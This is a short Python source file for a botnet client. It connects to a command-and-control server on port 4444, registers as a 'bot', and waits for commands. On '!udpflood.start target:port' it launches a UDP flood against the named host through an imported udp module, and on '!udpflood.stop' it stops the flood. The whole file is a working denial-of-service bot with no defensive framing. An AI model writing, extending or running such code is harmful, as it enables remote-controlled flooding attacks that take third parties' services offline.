from time import sleep
from modules import udp
import os,sys,socket

IP = '127.0.0.1'
PORT = 4444
BUFFER_SIZE = 1024

def createSocket():
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.connect((IP,PORT))
    client_socket.send('bot')
    return client_socket

def handleCommands(command):
    if "!udpflood.start" in command:
        options = command.split(' ')[1]
        target  = options.split(':')[0]
        port    = options.split(':')[1]
        udp._flood(target,port)
    elif "!udpflood.stop" in command:
        udp._stop()
    else:
        pass

def receiveCommands(client_socket):
    while True:
        try:
            command = client_socket.recv(BUFFER_SIZE)
            handleCommands(command)
        except:
            pass

if __name__ == '__main__':
    receiveCommands(createSocket())
